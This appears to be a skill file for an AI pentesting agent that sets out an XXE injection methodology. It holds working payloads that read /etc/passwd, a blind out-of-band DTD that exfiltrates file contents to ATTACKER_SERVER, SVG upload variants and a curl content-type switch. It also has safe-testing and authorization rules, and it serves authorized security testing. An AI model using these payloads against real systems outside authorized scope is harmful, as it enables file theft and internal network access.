---
name: attack-xxe
description: "XML External Entity injection — file read, SSRF, data exfiltration via out-of-band XML parsing"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - xxe
  - xml
  - injection
  - web
  - attack
tech_stack:
  - web
  - java
  - php
  - dotnet
cwe_ids:
  - CWE-611
  - CWE-827
chains_with:
  - attack-ssrf
prerequisites: []
severity_boost:
  attack-ssrf: "XXE + SSRF = internal network access via XML parser"
---

# XML External Entity (XXE) Injection

## Objective

Exploit XML parsing vulnerabilities to read local files, perform SSRF, or exfiltrate data via out-of-band channels.

## Testing Methodology

### Phase 1: Identify XML Processing

Look for endpoints accepting:
- `Content-Type: application/xml` or `text/xml`
- SOAP endpoints (`.asmx`, `.wsdl`)
- File upload accepting SVG, DOCX, XLSX
- RSS/Atom feed processing
- SAML authentication

### Phase 2: In-Band XXE (File Read)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Windows targets:**
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

### Phase 3: Blind XXE (Out-of-Band)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
  %xxe;
]>
<root>test</root>
```

**Hosted DTD (xxe.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

Use the SSRF listener for callback detection:
```bash
attack_script ssrf_listener -p 8888 -o xxe_hits.json
```

### Phase 4: XXE via File Upload

**SVG:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX:** Modify `[Content_Types].xml` or `word/document.xml` inside the ZIP.

### Phase 5: Content-Type Manipulation

```bash
# Switch JSON endpoint to XML
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### Phase 6: Parameter Entity Injection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
  %a;
]>
<root>&xxe;</root>
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Sensitive file read demonstrated with an approved non-sensitive canary | Severity depends on file sensitivity and impact; do not read secrets to prove the issue |
| Out-of-band DNS/HTTP callback confirms entity resolution only | Usually needs additional impact evidence; callback alone does not prove data disclosure or internal access |
| Server-side request via XXE reaches a controlled test endpoint or approved internal canary | Severity depends on reachable service and demonstrated impact |
| Entity-expansion/resource-exhaustion behavior | Do not test on production; severity requires authorized, controlled impact evidence |
| Error-based file path disclosure | Low (P4) |

## Evidence Requirements

- XML payload sent
- Response containing file contents or error
- For blind XXE: OOB interaction evidence (DNS/HTTP callback)
- Server type and parser identified

## Tools

- `attack_script ssrf_listener` — OOB callback listener for blind XXE
- `attack_script file_upload_tester` — SVG XXE via upload

## Parser and Out-of-Band Confirmation Matrix

Check parser behavior in this order: confirm the endpoint accepts XML, confirm whether a `DOCTYPE` is accepted, then test external entity resolution with a unique callback marker only when out-of-band testing is permitted.

- A parser accepting XML or a `DOCTYPE` does not prove external entity resolution. For blind XXE, require a unique DNS/HTTP callback before claiming an outbound entity fetch.
- A DNS callback confirms name resolution, not file disclosure or internal HTTP access. Keep those impact claims separate and demonstrate only the minimum safe proof.
- Where the application normally accepts JSON, test an XML content-type/body variation only if the endpoint is in scope and the request is harmless; do not assume every JSON endpoint has an XML parser.
- Avoid recursive entity expansion and oversized payloads. Never use a resource-exhaustion payload against production.

## Verification and Safe-Testing Gate

- Begin with a harmless XML document and a unique external-entity canary under a domain you control, where out-of-band testing is allowed. Confirm the parser actually resolves the entity before claiming XXE.
- Do not read operating-system secrets, cloud credentials, or another user's data to prove impact. Use a designated non-sensitive test file or an approved callback and stop after sufficient evidence.
- Distinguish XML parsing errors from entity expansion. A `DOCTYPE` accepted by the parser is not by itself proof that external entities are resolved.
- Test local file access, SSRF, and blind/OOB behavior as separate impact claims. A DNS callback alone confirms an outbound lookup but does not prove response-body disclosure or internal network access.
- Use small payloads and bounded timeouts; avoid recursive entity expansion, billion-laughs payloads, or other resource-exhaustion tests against production.
- Record the content type, parser behavior, request/response pair, callback timestamp if applicable, and exact impact. Redact secrets and credentials.
- [uphiago/recon-skills — XXE hunting](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-xxe/SKILL.md) (external research reference; not a local Cyber Strike skill path).
- [elementalsouls/Claude-BugHunter — XXE hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-xxe/SKILL.md) (external research reference; not a local Cyber Strike skill path).

## References

- [PortSwigger: XXE](https://portswigger.net/web-security/xxe)
- [OWASP: XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
